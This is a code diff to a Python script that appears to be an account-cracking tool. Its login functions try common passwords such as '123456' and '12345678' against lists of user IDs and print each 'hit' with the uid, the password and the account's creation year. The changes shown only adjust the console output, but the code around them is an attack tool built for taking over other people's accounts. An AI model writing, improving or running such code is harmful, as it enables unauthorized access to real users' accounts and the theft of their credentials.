@@ -5,7 +5,6 @@ import requests
 import config
 from utils import window1, creationyear
 
-# colour shortcuts
 G   = '\x1b[38;5;46m'
 Y   = '\x1b[38;5;220m'
 CY  = '\x1b[38;5;51m'
@@ -15,20 +14,21 @@ R   = '\x1b[38;5;196m'
 RST = '\x1b[0m'
 
 
-def _hit_line(method, uid, pw):
-    year = creationyear(uid)
+def _status_line(method):
     sys.stdout.write(
-        f"\r  {G}✔{RST}  {CY}[KABBO-M{method}]{RST}  "
-        f"{W}{uid}{RST}  {DIM}│{RST}  {Y}{pw}{RST}  {DIM}│{RST}  {G}{year}{RST}\n"
+        f"\r  {DIM}❯ KABBO-M{method}{RST}  "
+        f"Tried {CY}{config.loop}{RST}  {DIM}│{RST}  "
+        f"Hits {G}{len(config.oks)}{RST}    "
     )
     sys.stdout.flush()
 
 
-def _status_line(method):
+def _hit_line(method, uid, pw):
+    year = creationyear(uid)
+    year_str = f"  {DIM}│{RST}  {G}{year}{RST}" if year else ''
     sys.stdout.write(
-        f"\r  {DIM}[KABBO-M{method}]{RST}  "
-        f"Tried {CY}{config.loop}{RST}  │  "
-        f"Hits {G}{len(config.oks)}{RST}   "
+        f"\r  {G}✔{RST}  {CY}KABBO-M{method}{RST}  "
+        f"{W}{uid}{RST}  {DIM}│{RST}  {Y}{pw}{RST}{year_str}\n"
     )
     sys.stdout.flush()
 
@@ -36,8 +36,8 @@ def _status_line(method):
 def login_1(uid):
     session = requests.session()
     try:
-        _status_line(1)
         for pw in ('123456', '1234567', '12345678', '123456789'):
+            _status_line(1)
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -94,8 +94,8 @@ def login_1(uid):
 
 def login_2(uid):
     from random import randint as rr
-    _status_line(2)
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+        _status_line(2)
         try:
             with requests.Session() as session:
                 headers = {
